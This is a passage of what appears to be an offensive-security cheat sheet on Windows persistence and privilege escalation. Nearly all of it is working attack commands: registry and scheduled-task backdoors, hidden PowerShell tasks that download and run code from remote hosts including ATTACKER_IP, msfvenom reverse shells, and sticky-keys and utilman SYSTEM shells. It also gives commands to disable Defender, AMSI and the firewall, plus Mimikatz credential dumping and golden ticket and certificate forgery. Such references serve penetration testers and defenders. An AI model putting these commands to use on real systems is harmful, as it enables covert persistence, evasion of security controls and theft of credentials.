REG_SZ /d \u0026#34;C:\\tmp\\backdoor.exe\u0026#34; reg add \u0026#34;HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\RunServices\u0026#34; /v Evil /t REG_SZ /d \u0026#34;C:\\tmp\\backdoor.exe\u0026#34; reg add \u0026#34;HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\RunServicesOnce\u0026#34; /v Evil /t REG_SZ /d \u0026#34;C:\\tmp\\backdoor.exe\u0026#34; Winlogon Helper DLL # Run executable during Windows logon\nmsfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.10.10 LPORT=4444 -f exe \u0026gt; evilbinary.exe msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.10.10 LPORT=4444 -f dll \u0026gt; evilbinary.dll reg add \u0026#34;HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\u0026#34; /v Userinit /d \u0026#34;Userinit.exe, evilbinary.exe\u0026#34; /f reg add \u0026#34;HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\u0026#34; /v Shell /d \u0026#34;explorer.exe, evilbinary.exe\u0026#34; /f Set-ItemProperty \u0026#34;HKLM:\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\\u0026#34; \u0026#34;Userinit\u0026#34; \u0026#34;Userinit.exe, evilbinary.exe\u0026#34; -Force Set-ItemProperty \u0026#34;HKLM:\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\\u0026#34; \u0026#34;Shell\u0026#34; \u0026#34;explorer.exe, evilbinary.exe\u0026#34; -Force GlobalFlag # Run executable after notepad is killed\nreg add \u0026#34;HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\notepad.exe\u0026#34; /v GlobalFlag /t REG_DWORD /d 512 reg add \u0026#34;HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\SilentProcessExit\\notepad.exe\u0026#34; /v ReportingMode /t REG_DWORD /d 1 reg add \u0026#34;HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\SilentProcessExit\\notepad.exe\u0026#34; /v MonitorProcess /d \u0026#34;C:\\temp\\evil.exe\u0026#34; Startup Elevated # Create a batch script in the user startup folder.\nC:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp Services Elevated # Create a service that will start automatically or on-demand.\n# Powershell New-Service -Name \u0026#34;Backdoor\u0026#34; -BinaryPathName \u0026#34;C:\\Windows\\Temp\\backdoor.exe\u0026#34; -Description \u0026#34;Nothing to see here.\u0026#34; -StartupType Automatic sc start pentestlab # SharPersist SharPersist -t service -c \u0026#34;C:\\Windows\\System32\\cmd.exe\u0026#34; -a \u0026#34;/c backdoor.exe\u0026#34; -n \u0026#34;Backdoor\u0026#34; -m add # sc sc create Backdoor binpath= \u0026#34;cmd.exe /k C:\\temp\\backdoor.exe\u0026#34; start=\u0026#34;auto\u0026#34; obj=\u0026#34;LocalSystem\u0026#34; sc start Backdoor Scheduled Tasks Elevated # Scheduled Task to run as SYSTEM, everyday at 9am or on a specific day.\nProcesses spawned as scheduled tasks have taskeng.exe process as their parent\n# Powershell $A = New-ScheduledTaskAction -Execute \u0026#34;cmd.exe\u0026#34; -Argument \u0026#34;/c C:\\temp\\backdoor.exe\u0026#34; $T = New-ScheduledTaskTrigger -Daily -At 9am # OR $T = New-ScheduledTaskTrigger -Daily -At \u0026#34;9/30/2020 11:05:00 AM\u0026#34; $P = New-ScheduledTaskPrincipal \u0026#34;NT AUTHORITY\\SYSTEM\u0026#34; -RunLevel Highest $S = New-ScheduledTaskSettingsSet $D = New-ScheduledTask -Action $A -Trigger $T -Principal $P -Settings $S Register-ScheduledTask \u0026#34;Backdoor\u0026#34; -InputObject $D # Native schtasks schtasks /create /sc minute /mo 1 /tn \u0026#34;eviltask\u0026#34; /tr C:\\tools\\shell.cmd /ru \u0026#34;SYSTEM\u0026#34; schtasks /create /sc minute /mo 1 /tn \u0026#34;eviltask\u0026#34; /tr calc /ru \u0026#34;SYSTEM\u0026#34; /s dc-mantvydas /u user /p password schtasks /Create /RU \u0026#34;NT AUTHORITY\\SYSTEM\u0026#34; /tn [TaskName] /tr \u0026#34;regsvr32.exe -s \\\u0026#34;C:\\Users\\*\\AppData\\Local\\Temp\\[payload].dll\\\u0026#34;\u0026#34; /SC ONCE /Z /ST [Time] /ET [Time] ##(X86) - On User Login schtasks /create /tn OfficeUpdaterA /tr \u0026#34;c:\\windows\\system32\\WindowsPowerShell\\v1.0\\powershell.exe -WindowStyle hidden -NoLogo -NonInteractive -ep bypass -nop -c \u0026#39;IEX ((new-object net.webclient).downloadstring(\u0026#39;\u0026#39;http://192.168.95.195:8080/kBBldxiub6\u0026#39;\u0026#39;\u0026#39;))\u0026#39;\u0026#34; /sc onlogon /ru System ##(X86) - On System Start schtasks /create /tn OfficeUpdaterB /tr \u0026#34;c:\\windows\\system32\\WindowsPowerShell\\v1.0\\powershell.exe -WindowStyle hidden -NoLogo -NonInteractive -ep bypass -nop -c \u0026#39;IEX ((new-object net.webclient).downloadstring(\u0026#39;\u0026#39;http://192.168.95.195:8080/kBBldxiub6\u0026#39;\u0026#39;\u0026#39;))\u0026#39;\u0026#34; /sc onstart /ru System ##(X86) - On User Idle (30mins) schtasks /create /tn OfficeUpdaterC /tr \u0026#34;c:\\windows\\system32\\WindowsPowerShell\\v1.0\\powershell.exe -WindowStyle hidden -NoLogo -NonInteractive -ep bypass -nop -c \u0026#39;IEX ((new-object net.webclient).downloadstring(\u0026#39;\u0026#39;http://192.168.95.195:8080/kBBldxiub6\u0026#39;\u0026#39;\u0026#39;))\u0026#39;\u0026#34; /sc onidle /i 30 ##(X64) - On User Login schtasks /create /tn OfficeUpdaterA /tr \u0026#34;c:\\windows\\syswow64\\WindowsPowerShell\\v1.0\\powershell.exe -WindowStyle hidden -NoLogo -NonInteractive -ep bypass -nop -c \u0026#39;IEX ((new-object net.webclient).downloadstring(\u0026#39;\u0026#39;http://192.168.95.195:8080/kBBldxiub6\u0026#39;\u0026#39;\u0026#39;))\u0026#39;\u0026#34; /sc onlogon /ru System ##(X64) - On System Start schtasks /create /tn OfficeUpdaterB /tr \u0026#34;c:\\windows\\syswow64\\WindowsPowerShell\\v1.0\\powershell.exe -WindowStyle hidden -NoLogo -NonInteractive -ep bypass -nop -c \u0026#39;IEX ((new-object net.webclient).downloadstring(\u0026#39;\u0026#39;http://192.168.95.195:8080/kBBldxiub6\u0026#39;\u0026#39;\u0026#39;))\u0026#39;\u0026#34; /sc onstart /ru System ##(X64) - On User Idle (30mins) schtasks /create /tn OfficeUpdaterC /tr \u0026#34;c:\\windows\\syswow64\\WindowsPowerShell\\v1.0\\powershell.exe -WindowStyle hidden -NoLogo -NonInteractive -ep bypass -nop -c \u0026#39;IEX ((new-object net.webclient).downloadstring(\u0026#39;\u0026#39;http://192.168.95.195:8080/kBBldxiub6\u0026#39;\u0026#39;\u0026#39;))\u0026#39;\u0026#34; /sc onidle /i 30 Windows Management Instrumentation Event Subscription # An adversary can use Windows Management Instrumentation (WMI) to install event filters, providers, consumers, and bindings that execute code when a defined event occurs. Adversaries may use the capabilities of WMI to subscribe to an event and execute arbitrary code when that event occurs, providing persistence on a system.\n__EventFilter: Trigger (new process, failed logon etc.) EventConsumer: Perform Action (execute payload etc.) __FilterToConsumerBinding: Binds Filter and Consumer Classes # Using CMD : Execute a binary 60 seconds after Windows started wmic /NAMESPACE:\u0026#34;\\\\root\\subscription\u0026#34; PATH __EventFilter CREATE Name=\u0026#34;WMIPersist\u0026#34;, EventNameSpace=\u0026#34;root\\cimv2\u0026#34;,QueryLanguage=\u0026#34;WQL\u0026#34;, Query=\u0026#34;SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA \u0026#39;Win32_PerfFormattedData_PerfOS_System\u0026#39;\u0026#34; wmic /NAMESPACE:\u0026#34;\\\\root\\subscription\u0026#34; PATH CommandLineEventConsumer CREATE Name=\u0026#34;WMIPersist\u0026#34;, ExecutablePath=\u0026#34;C:\\Windows\\System32\\binary.exe\u0026#34;,CommandLineTemplate=\u0026#34;C:\\Windows\\System32\\binary.exe\u0026#34; wmic /NAMESPACE:\u0026#34;\\\\root\\subscription\u0026#34; PATH __FilterToConsumerBinding CREATE Filter=\u0026#34;__EventFilter.Name=\\\u0026#34;WMIPersist\\\u0026#34;\u0026#34;, Consumer=\u0026#34;CommandLineEventConsumer.Name=\\\u0026#34;WMIPersist\\\u0026#34;\u0026#34; # Remove it Get-WMIObject -Namespace root\\Subscription -Class __EventFilter -Filter \u0026#34;Name=\u0026#39;WMIPersist\u0026#39;\u0026#34; | Remove-WmiObject -Verbose # Using Powershell (deploy) $FilterArgs = @{name=\u0026#39;WMIPersist\u0026#39;; EventNameSpace=\u0026#39;root\\CimV2\u0026#39;; QueryLanguage=\u0026#34;WQL\u0026#34;; Query=\u0026#34;SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA \u0026#39;Win32_PerfFormattedData_PerfOS_System\u0026#39; AND TargetInstance.SystemUpTime \u0026gt;= 60 AND TargetInstance.SystemUpTime \u0026lt; 90\u0026#34;}; $Filter=New-CimInstance -Namespace root/subscription -ClassName __EventFilter -Property $FilterArgs $ConsumerArgs = @{name=\u0026#39;WMIPersist\u0026#39;; CommandLineTemplate=\u0026#34;$($Env:SystemRoot)\\System32\\binary.exe\u0026#34;;} $Consumer=New-CimInstance -Namespace root/subscription -ClassName CommandLineEventConsumer -Property $ConsumerArgs $FilterToConsumerArgs = @{Filter = [Ref] $Filter; Consumer = [Ref] $Consumer;} $FilterToConsumerBinding = New-CimInstance -Namespace root/subscription -ClassName __FilterToConsumerBinding -Property $FilterToConsumerArgs # Using Powershell (remove) $EventConsumerToCleanup = Get-WmiObject -Namespace root/subscription -Class CommandLineEventConsumer -Filter \u0026#34;Name = \u0026#39;WMIPersist\u0026#39;\u0026#34; $EventFilterToCleanup = Get-WmiObject -Namespace root/subscription -Class __EventFilter -Filter \u0026#34;Name = \u0026#39;WMIPersist\u0026#39;\u0026#34; $FilterConsumerBindingToCleanup = Get-WmiObject -Namespace root/subscription -Query \u0026#34;REFERENCES OF {$($EventConsumerToCleanup.__RELPATH)} WHERE ResultClass = __FilterToConsumerBinding\u0026#34; $FilterConsumerBindingToCleanup | Remove-WmiObject $EventConsumerToCleanup | Remove-WmiObject $EventFilterToCleanup | Remove-WmiObject Binary Replacement # Binary Replacement on Windows XP+ # Feature Executable Sticky Keys C:\\Windows\\System32\\sethc.exe Accessibility Menu C:\\Windows\\System32\\utilman.exe On-Screen Keyboard C:\\Windows\\System32\\osk.exe Magnifier C:\\Windows\\System32\\Magnify.exe Narrator C:\\Windows\\System32\\Narrator.exe Display Switcher C:\\Windows\\System32\\DisplaySwitch.exe App Switcher C:\\Windows\\System32\\AtBroker.exe In Metasploit : use post/windows/manage/sticky_keys\nBinary Replacement on Windows 10+ # Exploit a DLL hijacking vulnerability in the On-Screen Keyboard osk.exe executable.\nCreate a malicious HID.dll in C:\\Program Files\\Common Files\\microsoft shared\\ink\\HID.dll.\nRDP Backdoor # utilman.exe # At the login screen, press Windows Key+U, and you get a cmd.exe window as SYSTEM.\nREG ADD \u0026#34;HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\utilman.exe\u0026#34; /t REG_SZ /v Debugger /d \u0026#34;C:\\windows\\system32\\cmd.exe\u0026#34; /f sethc.exe # Hit F5 a bunch of times when you are at the RDP login screen.\nREG ADD \u0026#34;HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\sethc.exe\u0026#34; /t REG_SZ /v Debugger /d \u0026#34;C:\\windows\\system32\\cmd.exe\u0026#34; /f Remote Desktop Services Shadowing # :warning: FreeRDP and rdesktop don\u0026rsquo;t support Remote Desktop Services Shadowing feature.\nRequirements:\nRDP must be running reg add \u0026#34;HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows NT\\Terminal Services\u0026#34; /v Shadow /t REG_DWORD /d 4 # 4 – View Session without user’s permission. # Allowing remote connections to this computer reg add \u0026#34;HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\u0026#34; /v fDenyTSConnections /t REG_DWORD /d 0 /f # Disable UAC remote restriction reg add HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f mstsc /v:{ADDRESS} /shadow:{SESSION_ID} /noconsentprompt /prompt # /v parameter lets specify the {ADDRESS} value that is an IP address or a hostname of a remote host; # /shadow parameter is used to specify the {SESSION_ID} value that is a shadowee’s session ID; # /noconsentprompt parameter allows to bypass a shadowee’s permission and shadow their session without their consent; # /prompt parameter is used to specify a user’s credentials to connect to a remote host. Skeleton Key # # Exploitation Command runned as DA: Invoke-Mimikatz -Command \u0026#39;\u0026#34;privilege::debug\u0026#34; \u0026#34;misc::skeleton\u0026#34;\u0026#39; -ComputerName \u0026lt;DCs FQDN\u0026gt; # Access using the password \u0026#34;mimikatz\u0026#34; Enter-PSSession -ComputerName \u0026lt;AnyMachineYouLike\u0026gt; -Credential \u0026lt;Domain\u0026gt;\\Administrator Virtual Machines # Based on the Shadow Bunny technique.\n# download virtualbox Invoke-WebRequest \u0026#34;https://download.virtualbox.org/virtualbox/6.1.8/VirtualBox-6.1.8-137981-Win.exe\u0026#34; -OutFile $env:TEMP\\VirtualBox-6.1.8-137981-Win.exe # perform a silent install and avoid creating desktop and quick launch icons VirtualBox-6.0.14-133895-Win.exe --silent --ignore-reboot --msiparams VBOX_INSTALLDESKTOPSHORTCUT=0,VBOX_INSTALLQUICKLAUNCHSHORTCUT=0 # in \\Program Files\\Oracle\\VirtualBox\\VBoxManage.exe # Disabling notifications .\\VBoxManage.exe setextradata global GUI/SuppressMessages \u0026#34;all\u0026#34; # Download the Virtual machine disk Copy-Item \\\\smbserver\\images\\shadowbunny.vhd $env:USERPROFILE\\VirtualBox\\IT Recovery\\shadowbunny.vhd # Create a new VM $vmname = \u0026#34;IT Recovery\u0026#34; .\\VBoxManage.exe createvm --name $vmname --ostype \u0026#34;Ubuntu\u0026#34; --register # Add a network card in NAT mode .\\VBoxManage.exe modifyvm $vmname --ioapic on # required for 64bit .\\VBoxManage.exe modifyvm $vmname --memory 1024 --vram 128 .\\VBoxManage.exe modifyvm $vmname --nic1 nat .\\VBoxManage.exe modifyvm $vmname --audio none .\\VBoxManage.exe modifyvm $vmname --graphicscontroller vmsvga .\\VBoxManage.exe modifyvm $vmname --description \u0026#34;Shadowbunny\u0026#34; # Mount the VHD file .\\VBoxManage.exe storagectl $vmname -name \u0026#34;SATA Controller\u0026#34; -add sata .\\VBoxManage.exe storageattach $vmname -comment \u0026#34;Shadowbunny Disk\u0026#34; -storagectl \u0026#34;SATA Controller\u0026#34; -type hdd -medium \u0026#34;$env:USERPROFILE\\VirtualBox VMs\\IT Recovery\\shadowbunny.vhd\u0026#34; -port 0 # Start the VM .\\VBoxManage.exe startvm $vmname –type headless # optional - adding a shared folder # require: VirtualBox Guest Additions .\\VBoxManage.exe sharedfolder add $vmname -name shadow_c -hostpath c:\\ -automount # then mount the folder in the VM sudo mkdir /mnt/c sudo mount -t vboxsf shadow_c /mnt/c Domain # User Certificate # # Request a certificate for the User template .\\Certify.exe request /ca:CA01.megacorp.local\\CA01 /template:User # Convert the certificate for Rubeus openssl pkcs12 -in cert.pem -keyex -CSP \u0026#34;Microsoft Enhanced Cryptographic Provider v1.0\u0026#34; -export -out cert.pfx # Request a TGT using the certificate .\\Rubeus.exe asktgt /user:username /certificate:C:\\Temp\\cert.pfx /password:Passw0rd123! Golden Certificate # Require elevated privileges in the Active Directory, or on the ADCS machine\nExport CA as p12 file: certsrv.msc \u0026gt; Right Click \u0026gt; Back up CA... Alternative 1: Using Mimikatz you can extract the certificate as PFX/DER privilege::debug crypto::capi crypto::cng crypto::certificates /systemstore:local_machine /store:my /export Alternative 2: Using SharpDPAPI, then convert the certificate: openssl pkcs12 -in cert.pem -keyex -CSP \u0026quot;Microsoft Enhanced Cryptographic Provider v1.0\u0026quot; -export -out cert.pfx ForgeCert - Forge a certificate for any active domain user using the CA certificate ForgeCert.exe --CaCertPath ca.pfx --CaCertPassword Password123 --Subject CN=User --SubjectAltName harry@lab.local --NewCertPath harry.pfx --NewCertPassword Password123 ForgeCert.exe --CaCertPath ca.pfx --CaCertPassword Password123 --Subject CN=User --SubjectAltName DC$@lab.local --NewCertPath dc.pfx --NewCertPassword Password123 Finally you can request a TGT using the Certificate Rubeus.exe asktgt /user:ron /certificate:harry.pfx /password:Password123 Golden Ticket # Forge a Golden ticket using Mimikatz\nkerberos::purge kerberos::golden /user:evil /domain:pentestlab.local /sid:S-1-5-21-3737340914-2019594255-2413685307 /krbtgt:d125e4f69c851529045ec95ca80fa37e /ticket:evil.tck /ptt kerberos::tgt References # A view of persistence - Rastamouse Windows Persistence Commands - Pwn Wiki SharPersist Windows Persistence Toolkit in C - Brett Hawkins IIS Raid – Backdooring IIS Using Native Modules - 19/02/2020 Old Tricks Are Always Useful: Exploiting Arbitrary File Writes with Accessibility Tools - Apr 27, 2020 - @phraaaaaaa Persistence - Checklist - @netbiosX Persistence – Winlogon Helper DLL - @netbiosX Persistence - BITS Jobs - @netbiosX Persistence – Image File Execution Options Injection - @netbiosX Persistence – Registry Run Keys - @netbiosX Golden Certificate - NOVEMBER 15, 2021 Beware of the Shadowbunny - Using virtual machines to persist and evade detections - Sep 23, 2020 - wunderwuzzi Persistence – WMI Event Subscription - JANUARY 21, 2020 - pentestlab Persistence via WMI Event Subscription - Elastic Security Solution "},{"id":11,"href":"/docs/windows_privilege_escalation/","title":"Windows - Privilege Escalation","section":"Docs","content":" Windows - Privilege Escalation # Tools # PowerSploit\u0026rsquo;s PowerUp powershell -Version 2 -nop -exec bypass IEX (New-Object Net.WebClient).DownloadString(\u0026#39;https://raw.githubusercontent.com/PowerShellEmpire/PowerTools/master/PowerUp/PowerUp.ps1\u0026#39;); Invoke-AllChecks Watson - Watson is a (.NET 2.0 compliant) C# implementation of Sherlock (Deprecated) Sherlock - PowerShell script to quickly find missing software patches for local privilege escalation vulnerabilities powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -File Sherlock.ps1 BeRoot - Privilege Escalation Project - Windows / Linux / Mac Windows-Exploit-Suggester ./windows-exploit-suggester.py --update ./windows-exploit-suggester.py --database 2014-06-06-mssb.xlsx --systeminfo win7sp1-systeminfo.txt windows-privesc-check - Standalone Executable to Check for Simple Privilege Escalation Vectors on Windows Systems WindowsExploits - Windows exploits, mostly precompiled. Not being updated. WindowsEnum - A Powershell Privilege Escalation Enumeration Script. Seatbelt - A C# project that performs a number of security oriented host-survey \u0026ldquo;safety checks\u0026rdquo; relevant from both offensive and defensive security perspectives. Seatbelt.exe -group=all -full Seatbelt.exe -group=system -outputfile=\u0026#34;C:\\Temp\\system.txt\u0026#34; Seatbelt.exe -group=remote -computername=dc.theshire.local -computername=192.168.230.209 -username=THESHIRE\\sam -password=\u0026#34;yum \\\u0026#34;po-ta-toes\\\u0026#34;\u0026#34; Powerless - Windows privilege escalation (enumeration) script designed with OSCP labs (legacy Windows) in mind JAWS - Just Another Windows (Enum) Script powershell.exe -ExecutionPolicy Bypass -File .\\jaws-enum.ps1 -OutputFilename JAWS-Enum.txt winPEAS - Windows Privilege Escalation Awesome Script Windows Exploit Suggester - Next Generation (WES-NG) # First obtain systeminfo systeminfo systeminfo \u0026gt; systeminfo.txt # Then feed it to wesng python3 wes.py --update-wes python3 wes.py --update python3 wes.py systeminfo.txt PrivescCheck - Privilege Escalation Enumeration Script for Windows C:\\Temp\\\u0026gt;powershell -ep bypass -c \u0026#34;. .\\PrivescCheck.ps1; Invoke-PrivescCheck\u0026#34; C:\\Temp\\\u0026gt;powershell -ep bypass -c \u0026#34;. .\\PrivescCheck.ps1; Invoke-PrivescCheck -Extended\u0026#34; C:\\Temp\\\u0026gt;powershell -ep bypass -c \u0026#34;. .\\PrivescCheck.ps1; Invoke-PrivescCheck -Report PrivescCheck_%COMPUTERNAME% -Format TXT,CSV,HTML\u0026#34; Windows Version and Configuration # systeminfo | findstr /B /C:\u0026#34;OS Name\u0026#34; /C:\u0026#34;OS Version\u0026#34; Extract patchs and updates\nwmic qfe Architecture\nwmic os get osarchitecture || echo %PROCESSOR_ARCHITECTURE% List all env variables\nset Get-ChildItem Env: | ft Key,Value List all drives\nwmic logicaldisk get caption || fsutil fsinfo drives wmic logicaldisk get caption,description,providername Get-PSDrive | where {$_.Provider -like \u0026#34;Microsoft.PowerShell.Core\\FileSystem\u0026#34;}| ft Name,Root User Enumeration # Get current username\necho %USERNAME% || whoami $env:username List user privilege\nwhoami /priv whoami /groups List all users\nnet user whoami /all Get-LocalUser | ft Name,Enabled,LastLogon Get-ChildItem C:\\Users -Force | select Name List logon requirements; useable for bruteforcing\nnet accounts Get details about a user (i.e. administrator, admin, current user)\nnet user administrator net user admin net user %USERNAME% List all local groups\nnet localgroup Get-LocalGroup | ft Name Get details about a group (i.e. administrators)\nnet localgroup administrators Get-LocalGroupMember Administrators | ft Name, PrincipalSource Get-LocalGroupMember Administrateurs | ft Name, PrincipalSource Get Domain Controllers\nnltest /DCLIST:DomainName nltest /DCNAME:DomainName nltest /DSGETDC:DomainName Network Enumeration # List all network interfaces, IP, and DNS.\nipconfig /all Get-NetIPConfiguration | ft InterfaceAlias,InterfaceDescription,IPv4Address Get-DnsClientServerAddress -AddressFamily IPv4 | ft List current routing table\nroute print Get-NetRoute -AddressFamily IPv4 | ft DestinationPrefix,NextHop,RouteMetric,ifIndex List the ARP table\narp -A Get-NetNeighbor -AddressFamily IPv4 | ft ifIndex,IPAddress,LinkLayerAddress,State List all current connections\nnetstat -ano List all network shares\nnet share powershell Find-DomainShare -ComputerDomain domain.local SNMP Configuration\nreg query HKLM\\SYSTEM\\CurrentControlSet\\Services\\SNMP /s Get-ChildItem -path HKLM:\\SYSTEM\\CurrentControlSet\\Services\\SNMP -Recurse Antivirus \u0026amp; Detections # Enumerate antivirus on a box with WMIC /Node:localhost /Namespace:\\\\root\\SecurityCenter2 Path AntivirusProduct Get displayName\nWindows Defender # # check status of Defender PS C:\\\u0026gt; Get-MpComputerStatus # disable scanning all downloaded files and attachments, disable AMSI (reactive) PS C:\\\u0026gt; Set-MpPreference -DisableRealtimeMonitoring $true; Get-MpComputerStatus PS C:\\\u0026gt; Set-MpPreference -DisableIOAVProtection $true # disable AMSI (set to 0 to enable) PS C:\\\u0026gt; Set-MpPreference -DisableScriptScanning 1 # exclude a folder PS C:\\\u0026gt; Add-MpPreference -ExclusionPath \u0026#34;C:\\Temp\u0026#34; PS C:\\\u0026gt; Add-MpPreference -ExclusionPath \u0026#34;C:\\Windows\\Tasks\u0026#34; PS C:\\\u0026gt; Set-MpPreference -ExclusionProcess \u0026#34;word.exe\u0026#34;, \u0026#34;vmwp.exe\u0026#34; # remove signatures (if Internet connection is present, they will be downloaded again): PS \u0026gt; \u0026amp; \u0026#34;C:\\ProgramData\\Microsoft\\Windows Defender\\Platform\\4.18.2008.9-0\\MpCmdRun.exe\u0026#34; -RemoveDefinitions -All PS \u0026gt; \u0026amp; \u0026#34;C:\\Program Files\\Windows Defender\\MpCmdRun.exe\u0026#34; -RemoveDefinitions -All Firewall # List firewall state and current configuration\nnetsh advfirewall firewall dump # or netsh firewall show state netsh firewall show config List firewall\u0026rsquo;s blocked ports\n$f=New-object -comObject HNetCfg.FwPolicy2;$f.rules | where {$_.action -eq \u0026#34;0\u0026#34;} | select name,applicationname,localports Disable firewall\n# Disable Firewall on Windows 7 via cmd reg add \u0026#34;HKEY_LOCAL_MACHINE\\SYSTEM\\CurentControlSet\\Control\\Terminal Server\u0026#34; /v fDenyTSConnections /t REG_DWORD /d 0 /f # Disable Firewall on Windows 7 via Powershell powershell.exe -ExecutionPolicy Bypass -command \u0026#39;Set-ItemProperty -Path \u0026#34;HKLM:\\System\\CurrentControlSet\\Control\\Terminal Server\u0026#34; -Name \u0026#34;fDenyTSConnections\u0026#34; –Value\u0026#39;` # Disable Firewall on any windows via cmd netsh firewall set opmode disable netsh Advfirewall set allprofiles state off AppLocker Enumeration # With the GPO HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\SrpV2 (Keys: Appx, Dll, Exe, Msi and Script). List AppLocker rules\nPowerView PS C:\\\u0026gt; Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections AppLocker Bypass\nBy default, C:\\Windows is not blocked, and C:\\Windows\\Tasks is writtable by any users https://github.com/api0cradle/UltimateAppLockerByPassList/blob/master/Generic-AppLockerbypasses.md https://github.com/api0cradle/UltimateAppLockerByPassList/blob/master/VerifiedAppLockerBypasses.md https://github.com/api0cradle/UltimateAppLockerByPassList/blob/master/DLL-Execution.md Powershell # Default powershell locations in a Windows system.\nC:\\windows\\syswow64\\windowspowershell\\v1.0\\powershell C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell Powershell Constrained Mode # Check if we are in a constrained mode: $ExecutionContext.SessionState.LanguageMode bypass-clm - PowerShell Constrained Language Mode Bypass PowerShdll - Powershell with no Powershell.exe via DLL\u0026rsquo;s: rundll32.exe C:\\temp\\PowerShdll.dll,main Other bypasses PS \u0026gt; \u0026amp;{ whoami } powershell.exe -v 2 -ep bypass -command \u0026#34;IEX (New-Object Net.WebClient).DownloadString(\u0026#39;http://ATTACKER_IP/rev.ps1\u0026#39;)\u0026#34; AMSI Bypass # Find more AMSI bypass: here\nPS C:\\\u0026gt; [Ref].Assembly.GetType(\u0026#39;System.Management.Automation.Ams\u0026#39;+\u0026#39;iUtils\u0026#39;).GetField(\u0026#39;am\u0026#39;+\u0026#39;siInitFailed\u0026#39;,\u0026#39;NonPu\u0026#39;+\u0026#39;blic,Static\u0026#39;).SetValue($null,$true) Default Writeable Folders # C:\\Windows\\System32\\Microsoft\\Crypto\\RSA\\MachineKeys C:\\Windows\\System32\\spool\\drivers\\color C:\\Windows\\System32\\spool\\printers C:\\Windows\\System32\\spool\\servers C:\\Windows\\tracing C:\\Windows\\Temp C:\\Users\\Public C:\\Windows\\Tasks C:\\Windows\\System32\\tasks C:\\Windows\\SysWOW64\\tasks C:\\Windows\\System32\\tasks_migrated\\microsoft\\windows\\pls\\system C:\\Windows\\SysWOW64\\tasks\\microsoft\\windows\\pls\\system C:\\Windows\\debug\\wia C:\\Windows\\registration\\crmlog C:\\Windows\\System32\\com\\dmp C:\\Windows\\SysWOW64\\com\\dmp C:\\Windows\\System32\\fxstmp C:\\Windows\\SysWOW64\\fxstmp EoP - Looting for passwords # SAM and SYSTEM files # The Security Account Manager (SAM), often Security Accounts Manager, is a database file. The user passwords are stored in a hashed format in a registry hive either as a LM hash or as a NTLM hash. This file can be found in %SystemRoot%/system32/config/SAM and is mounted on HKLM/SAM.\n# Usually %SYSTEMROOT% = C:\\Windows %SYSTEMROOT%\\repair\\SAM %SYSTEMROOT%\\System32\\config\\RegBack\\SAM %SYSTEMROOT%\\System32\\config\\SAM %SYSTEMROOT%\\repair\\system %SYSTEMROOT%\\System32\\config\\SYSTEM %SYSTEMROOT%\\System32\\config\\RegBack\\system Generate a hash file for John using pwdump or samdump2.\npwdump SYSTEM SAM \u0026gt; /root/sam.txt samdump2 SYSTEM SAM -o sam.txt Either crack it with john -format=NT /root/sam.txt, hashcat or use Pass-The-Hash.\nLAPS Settings # Extract HKLM\\Software\\Policies\\Microsoft Services\\AdmPwd from Windows Registry.\nLAPS Enabled: AdmPwdEnabled LAPS Admin Account Name: AdminAccountName LAPS Password Complexity: PasswordComplexity LAPS Password Length: PasswordLength LAPS Expiration Protection Enabled: PwdExpirationProtectionEnabled HiveNightmare # CVE-2021–36934 allows you to retrieve all registry hives (SAM,SECURITY,SYSTEM) in Windows 10 and 11 as a non-administrator user\nCheck for the vulnerability using icacls\nC:\\Windows\\System32\u0026gt; icacls config\\SAM config\\SAM BUILTIN\\Administrators:(I)(F) NT AUTHORITY\\SYSTEM:(I)(F) BUILTIN\\Users:(I)(RX) \u0026lt;-- this is wrong - regular users should not have read access! Then exploit the CVE by requesting the shadowcopies on the filesystem and reading the hives from it.\nmimikatz\u0026gt; token::whoami /full # List shadow copies available mimikatz\u0026gt; misc::shadowcopies # Extract account from SAM databases mimikatz\u0026gt; lsadump::sam /system:\\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy1\\Windows\\System32\\config\\SYSTEM /sam:\\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy1\\Windows\\System32\\config\\SAM # Extract secrets from SECURITY mimikatz\u0026gt; lsadump::secrets /system:\\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy1\\Windows\\System32\\config\\SYSTEM /security:\\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy1\\Windows\\System32\\config\\SECURITY Search for file contents # cd C:\\ \u0026amp; findstr /SI /M \u0026#34;password\u0026#34; *.xml *.ini *.txt findstr /si password *.xml *.ini *.txt *.config findstr /spin \u0026#34;password\u0026#34; *.* Search for a file with a certain filename # dir /S /B *pass*.txt == *pass*.xml == *pass*.ini == *cred* == *vnc* == *.config* where /R C:\\ user.txt where /R C:\\ *.ini Search the registry for key names and passwords # REG QUERY HKLM /F \u0026#34;password\u0026#34; /t REG_SZ /S /K REG QUERY HKCU /F \u0026#34;password\u0026#34; /t REG_SZ /S /K reg query 